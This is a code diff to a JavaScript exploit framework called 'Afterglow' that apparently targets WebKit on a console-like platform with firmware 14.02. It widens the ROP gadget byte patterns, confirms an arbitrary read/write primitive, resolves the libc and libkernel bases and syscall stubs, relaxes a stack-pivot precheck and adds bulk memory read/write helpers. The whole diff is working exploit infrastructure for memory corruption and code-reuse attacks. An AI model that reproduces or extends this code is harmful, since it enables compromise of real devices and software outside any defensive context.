@@ -24,8 +24,8 @@ const AFTERGLOW_CRITICAL_GADGETS = [
   ['wk_POP_RSI_RET', [0x5e, 0xc3]],
   ['wk_POP_RDX_RET', [0x5a, 0xc3]],
   ['wk_POP_RCX_RET', [0x59, 0xc3]],
-  ['wk_POP_R8_RET', [0x41, 0x58, 0xc3]],
-  ['wk_POP_R9_RET', [0x41, 0x59, 0xc3]],
+  ['wk_POP_R8_RET', [[0x41, 0x58, 0xc3], [0x47, 0x58, 0xc3]]],
+  ['wk_POP_R9_RET', [[0x41, 0x59, 0xc3], [0x47, 0x59, 0xc3]]],
   ['wk_POP_RBP_RET', [0x5d, 0xc3]],
   ['wk_POP_RSP_RET', [0x5c, 0xc3]],
   ['wk_LEAVE_RET', [0xc9, 0xc3]],
@@ -104,7 +104,7 @@ function afterglow_check_arw() {
     throw new Error('ARW write did not reach the ArrayBuffer');
   }
 
-  logger.info('ARW round-trip OK');
+  logger.debug('ARW round-trip OK');
 }
 
 // Rebuild the WebKit base the same way rop.init() does, but before rop.init()
@@ -150,9 +150,12 @@ function afterglow_validate_gadgets(base) {
       return;
     }
 
-    const got = afterglow_read_bytes(addr, want.length);
-    const ok = got.every((byte, i) => byte === want[i]);
-    const line = `${name} @ ${addr}: ${afterglow_hex(got)} (want ${afterglow_hex(want)})`;
+    const alternatives = Array.isArray(want[0]) ? want : [want];
+    const got = afterglow_read_bytes(addr, alternatives[0].length);
+    const ok = alternatives.some((alt) => got.every((byte, i) => byte === alt[i]));
+    const line = `${name} @ ${addr}: ${afterglow_hex(got)} (want ${alternatives
+      .map(afterglow_hex)
+      .join(' or ')})`;
 
     if (ok) {
       logger.debug(`ok ${line}`);
@@ -172,7 +175,7 @@ function afterglow_validate_gadgets(base) {
     throw new Error(`WebKit gadget validation failed:\n${failures.join('\n')}`);
   }
 
-  logger.info(
+  logger.debug(
     `WebKit gadgets validated: ${AFTERGLOW_CRITICAL_GADGETS.length} critical` +
       ` + ${AFTERGLOW_OPTIONAL_GADGETS.length} optional`,
   );
@@ -198,12 +201,12 @@ function afterglow_validate_bases(base) {
 
   const missing = AFTERGLOW_SYSCALLS.filter((id) => !syscalls.has(id));
   if (missing.length) {
-    logger.warn(`libkernel stubs Wobkot did not find: ${missing.join(', ')} (Afterglow will retry)`);
+    logger.debug(`libkernel stubs Wobkot did not find: ${missing.join(', ')} (Afterglow will retry)`);
   }
 
-  logger.info(`libc base: ${libc_base}`);
-  logger.info(`libkernel base: ${libkernel_base}`);
-  logger.info(`libkernel syscall stubs: ${syscalls.size}`);
+  logger.debug(`libc base: ${libc_base}`);
+  logger.debug(`libkernel base: ${libkernel_base}`);
+  logger.debug(`libkernel syscall stubs: ${syscalls.size}`);
 }
 
 // rop.init() scans libkernel as soon as it has a base. Verify that base from
@@ -231,8 +234,8 @@ function afterglow_precheck_kernel_bases(base) {
 
   logger.debug(`strerror_addr: ${strerror_addr}`);
   logger.debug(`_error_addr: ${error_addr}`);
-  logger.info(`libc base precheck: ${libc}`);
-  logger.info(`libkernel base precheck: ${libkernel}`);
+  logger.debug(`libc base precheck: ${libc}`);
+  logger.debug(`libkernel base precheck: ${libkernel}`);
 
   return { libc, libkernel };
 }
@@ -258,17 +261,17 @@ function afterglow_precheck_pivot() {
   }
 
   const saved_ret = arw.view(rbp).getBInt(8, true);
-  const saved_ptr = arw.view(rbp).getBInt(0x10, true);
+  const saved_slot = arw.view(rbp).getBInt(0x10, true);
 
+  // +0x08 is the saved return address and must be code. +0x10 is only saved
+  // and restored by the pivot; on 14.02 it is a NaN-boxed JSValue, not a frame
+  // pointer, so it is logged but not required to be userland code.
   if (saved_ret.eq(0) || saved_ret.hi >= 0x80000000) {
     throw new Error(`topEntryFrame saved return ${saved_ret} is not userland`);
   }
-  if (saved_ptr.eq(0) || saved_ptr.hi >= 0x80000000) {
-    throw new Error(`topEntryFrame saved pointer ${saved_ptr} is not userland`);
-  }
 
-  logger.info(
-    `ROP pivot precheck: topEntryFrame ${rbp}, saved ret ${saved_ret}, saved ptr ${saved_ptr}`,
+  logger.debug(
+    `ROP pivot precheck: topEntryFrame ${rbp}, saved ret ${saved_ret}, slot+0x10 ${saved_slot}`,
   );
 }
 
@@ -346,6 +349,15 @@ function make_afterglow_ctx(options) {
     readInto(u8, at, len) {
       const dst = u8.buffer.data().add(u8.byteOffset);
       mem.copy(dst, afterglow_to_bint(at), len);
+    },
+    writeBulk(at, bytes) {
+      const src = bytes.buffer.data().add(bytes.byteOffset);
+      mem.copy(afterglow_to_bint(at), src, bytes.length);
+    },
+    readBulk(at, len) {
+      const out = new Uint8Array(len);
+      this.readInto(out, at, len);
+      return out;
     },
   };
 
